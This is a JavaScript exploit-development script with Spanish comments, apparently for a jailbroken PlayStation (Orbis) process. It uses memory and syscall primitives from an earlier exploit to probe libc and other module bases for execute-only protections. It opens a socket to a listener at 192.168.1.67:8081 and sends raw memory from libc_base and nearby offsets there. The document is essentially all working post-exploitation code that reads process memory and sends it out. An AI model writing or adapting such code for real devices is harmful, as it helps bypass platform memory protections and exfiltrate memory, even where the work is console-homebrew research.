// 2026-08-27 diag_raw2_1320: write(sock,addr,N) crudo sync = sonda: uiomove lee addr -> EFAULT limpio si no legible; si legible, los N bytes llegan al listener 192.168.1.67:8081 (sonda+volcado).
// v2: pipe(42) roto en Orbis (fds=0,0->EBADF) => pipe ELIMINADO. read64 crudo de libc_base = SIGSEGV 3/3 => read64 solo PASO 7 condicionado.
// Cada sonda es syscall write; si la region es XOM/SAR el kernel puede MATAR el proceso en PASO 4/5/6 - el ultimo "ejecutando" identifica al culpable.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const E=(n,s)=>W("[diag] PASO "+n+": "+s+" - ejecutando"),R=(n,v)=>W("[diag] PASO "+n+" result: "+v);
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const Sp=(a,n)=>{const r=I(syscall(SYSCALL.write,sock,a,BigInt(n)));if(r<0n){let s="errno?";try{s=get_error_string()}catch(x){s="errstr EX "+x}return{d:"ERR "+s,f:/^14(\s|$)/.test(s)||/EFAULT/.test(s)}}return{d:"ok "+r+"B -> listener",f:false}};
let OK4=false;
E(1,"getpid (baseline runtime vivo)");try{const p=I(syscall(SYSCALL.getpid));R(1,"pid="+p)}catch(e){R(1,"EX "+e)}
E(2,"CONTROL write(sock,ctrl=0x41x8,8): 8xA deben llegar al PC");try{const c=malloc(64);write64(c,0x4141414141414141n);const p=Sp(c,8);R(2,p.d+(p.f?" -> METODO ROTO (EFAULT heap!)":" -> ok"))}catch(e){R(2,"EX "+e)}
E(3,"libc_base (typeof+toHex, sin leer)");try{if(typeof libc_base==="undefined")R(3,"libc_base NO EXISTE");else R(3,"libc_base="+toHex(B(libc_base)))}catch(e){R(3,"EX "+e)}
E(4,"CRITICO write(sock,libc_base,32): muerte=XOM/SAR, EFAULT=no legible, ok=32B al PC");try{if(typeof libc_base==="undefined")R(4,"SKIPPED");else{const p=Sp(B(libc_base),32);OK4=!p.f;R(4,toHex(B(libc_base))+" -> "+p.d+(p.f?" NO LEGIBLE":""))}}catch(e){R(4,"EX "+e)}
E(5,"write(sock,libc_base+0x4000,32) 2a pagina");try{if(typeof libc_base==="undefined")R(5,"SKIPPED");else{const a=B(libc_base)+0x4000n,p=Sp(a,32);R(5,toHex(a)+" -> "+p.d)}}catch(e){R(5,"EX "+e)}
E(6,"write(sock,libc_base+0x400000,32) 1MB .text?");try{if(typeof libc_base==="undefined")R(6,"SKIPPED");else{const a=B(libc_base)+0x400000n,p=Sp(a,32);R(6,toHex(a)+" -> "+p.d)}}catch(e){R(6,"EX "+e)}
E(7,"read64(libc_base) SOLO si P4 ok");try{if(typeof libc_base==="undefined")R(7,"SKIPPED");else if(!OK4)R(7,"SKIPPED (P4 no ok)");else{const q=read64(B(libc_base));R(7,toHex(q)+((q&0xffffffffn)===0x464c457fn?" ELF OK":" NO ELF"))}}catch(e){R(7,"EX "+e)}
E(8,"eboot_base / libstarboard_base (sin leer)");try{const P=[];try{P.push("eb="+(typeof eboot_base==="undefined"?"NO EXISTE":toHex(B(eboot_base))))}catch(e){P.push("eb EX "+e)}try{P.push("sb="+(typeof libstarboard_base==="undefined"?"NO EXISTE":toHex(B(libstarboard_base))))}catch(e){P.push("sb EX "+e)}R(8,P.join("|"))}catch(e){R(8,"EX "+e)}
E(9,"getpid final + send_notification");try{const p=I(syscall(SYSCALL.getpid));R(9,"pid="+p);W("[diag] COMPLETO: consola viva");try{send_notification("[diag2] done")}catch(e){}}catch(e){R(9,"EX "+e)}
E(10,"close(sock)");try{if(sock>=0n)syscall(SYSCALL.close,sock);R(10,"sock "+sock+" cerrado")}catch(e){R(10,"EX "+e)}
})();
